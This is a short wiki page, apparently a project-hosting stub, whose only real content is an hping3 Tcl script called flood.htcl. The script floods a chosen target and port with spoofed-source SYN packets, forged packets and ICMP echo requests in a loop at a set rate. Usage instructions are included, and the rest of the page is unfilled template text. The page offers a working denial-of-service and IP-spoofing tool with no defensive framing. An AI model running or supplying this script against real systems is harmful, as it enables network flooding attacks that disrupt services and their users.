# Introduction #
## hping ##
```
#Usage; hping3 exec ./flood.htcl <target> <dstport> <spoofed ip> <packet count> <speed>

if {$argc < 5} {
  puts "exaple: hping3 exec ./flood.htcl 192.168.254.2 135 123.456.78.90 100 5000"
  exit 1
  }
  
  foreach {hostname port spoofedip packets speed} $argv break
  set target [hping resolve $hostname]
  
  puts "flooding: $target"
  puts "on port: $port"
  puts "spoofed ip: $spoofedip"
  puts "packet count: $packets"
  puts "speed: $speed"

for {set i 1} {$i<$packets} {incr i} {
hping send "ip(saddr=$spoofedip,daddr=$target,ttl=255)+tcp(sport=$i,dport=$port,flags=s)"
hping send "ip(saddr=$target,daddr=66.66.66.66,ttl=255)+tcp(sport=66,dport=80,flags=aspu)"
hping send "ip(saddr=$spoofedip,daddr=$target,ttl=255)+tcp(sport=999,dport=$port,flags=s)"
hping send "ip(saddr=$spoofedip,daddr=$target,ttl=$i)+icmp(type=8,code=0)"
after $speed
}
```

# Details #

Add your content here.  Format your content with:
  * Text in **bold** or _italic_
  * Headings, paragraphs, and lists
  * Automatic links to other wiki pages